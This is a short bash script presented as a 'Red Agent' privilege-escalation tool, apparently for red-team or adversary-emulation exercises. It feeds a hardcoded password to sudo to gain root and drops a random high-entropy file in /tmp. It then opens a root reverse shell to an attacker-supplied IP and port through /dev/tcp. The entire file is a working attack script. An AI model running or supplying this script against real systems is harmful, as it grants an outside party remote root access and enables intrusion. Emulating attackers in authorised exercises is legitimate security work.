#!/bin/bash

# Red Agent Privilege Escalation Script with High-Entropy File Dropping

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <attacker-ip> <attacker-port>"
    echo "Example: $0 10.0.0.1 4445"
    exit 1
fi

attacker_ip=$1
attacker_port=$2

echo "[*] Attempting privilege escalation..."

# Try to escalate to root
if printf '1234\n' | sudo -S whoami 2>/dev/null | grep -q root; then
    echo "[+] Privilege escalation successful."

    # Generate a unique file name and file path
    RAND_FILE="high_entropy_$(date +%s)_$RANDOM.bin"
    FILE_PATH="/tmp/$RAND_FILE"

    echo "[*] Creating high-entropy file at $FILE_PATH"

    # Generate high-entropy content
    base64 < /dev/urandom | head -c 2048 > "$FILE_PATH"

    # Confirm file creation
    if [ -f "$FILE_PATH" ]; then
        echo "[+] High-entropy file dropped: $FILE_PATH"
    else
        echo "[-] Failed to create high-entropy file."
    fi

    # Spawn reverse shell as root
    echo "[*] Spawning reverse shell to $attacker_ip:$attacker_port ..."
    printf '1234\n' | sudo -S /bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"
else
    echo "[!] Privilege escalation failed."
fi
